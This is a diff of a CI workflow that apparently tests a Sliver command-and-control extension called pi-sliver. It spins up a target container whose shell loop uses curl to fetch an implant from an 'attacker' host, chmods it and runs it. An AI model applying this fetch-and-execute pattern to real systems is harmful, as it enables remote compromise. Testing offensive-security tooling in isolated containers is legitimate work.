@@ -5,13 +5,12 @@ on:
     branches: [main]
     paths:
       - 'pi-sliver/**'
-      - 'ci/**'
-      - '.github/workflows/pi-sliver-ci.yml'
+      - '.github/**'
   pull_request:
     branches: [main]
     paths:
       - 'pi-sliver/**'
-      - 'ci/**'
+      - '.github/**'
   workflow_dispatch:
 
 jobs:
@@ -32,8 +31,8 @@ jobs:
 
       # ---------------------------------------------------------------
       # Target container: minimal Linux box the implant will run on.
-      # We pre-install curl so the implant download works, and run a
-      # tiny HTTP health-check on :8080 so CI can verify the box is up.
+      # Pre-installs curl/bash/python3, then polls for the implant
+      # binary every 2 seconds from the attacker's HTTP server.
       # ---------------------------------------------------------------
       - name: Start target container
         run: |
@@ -43,8 +42,9 @@ jobs:
             alpine:3.19 \
             sh -c 'apk add --no-cache curl bash python3 &&
               echo "ready" > /tmp/ready &&
+              python3 -m http.server 8080 --directory /tmp &
               echo "Polling for implant at http://attacker:8888/implant..." &&
-              for i in $(seq 1 120); do
+              for i in $(seq 1 240); do
                 if curl -sf http://attacker:8888/implant -o /tmp/implant 2>/dev/null; then
                   chmod +x /tmp/implant &&
                   echo "Implant downloaded, executing..." &&
@@ -57,10 +57,9 @@ jobs:
 
       # ---------------------------------------------------------------
       # Attacker container: runs Pi + Sliver server + pi-sliver ext.
-      # We build it from the ci/attacker/Dockerfile.
       # ---------------------------------------------------------------
       - name: Build attacker image
-        run: docker build -t attacker -f ci/attacker/Dockerfile .
+        run: docker build -t attacker -f .github/attacker/Dockerfile .
 
       - name: Run attacker and execute test suite
         run: |
